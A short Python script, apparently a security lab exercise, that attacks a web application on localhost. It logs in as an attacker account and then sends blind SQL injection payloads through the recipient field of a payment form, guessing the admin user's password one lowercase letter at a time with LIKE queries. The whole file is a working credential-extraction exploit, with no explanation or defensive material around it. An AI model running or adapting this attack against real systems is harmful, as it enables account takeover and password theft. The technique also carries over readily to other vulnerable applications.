from requests import codes, Session
import string
LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "token": sess.cookies.get("session")
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    
    alphabet = list(string.ascii_lowercase)
    password = ''
    while True:
        response = submit_pay_form(sess, "{}' AND password = '{}".format(username,password),0)
        if response:
            print(password)
            return password
        for i in alphabet:
            letter = i
            response = submit_pay_form(sess,
                "{}' AND password LIKE '{}".format(username,password+letter+'%'),0)
            if response:
                password += letter
                break
        
    print('password not found')
    return

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
